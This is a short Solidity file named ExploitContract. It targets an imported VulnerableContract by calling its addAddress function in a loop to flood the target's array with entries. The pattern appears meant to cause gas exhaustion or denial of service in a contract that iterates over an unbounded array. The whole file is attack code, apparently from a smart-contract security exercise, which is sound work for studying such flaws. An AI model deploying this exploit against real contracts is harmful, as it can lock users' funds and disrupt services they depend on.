// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableContract.sol";

contract ExploitContract {
    VulnerableContract public vulnerableContract;

    constructor(address _vulnerableContract) {
        vulnerableContract = VulnerableContract(_vulnerableContract);
    }

    // Flood the vulnerable contract's array with a large number of addresses
    function floodAddresses(uint256 count) public {
        for (uint256 i = 0; i < count; i++) {
            vulnerableContract.addAddress(address(this));
        }
    }

    // Receive Ether from the vulnerable contract
    receive() external payable {}
}
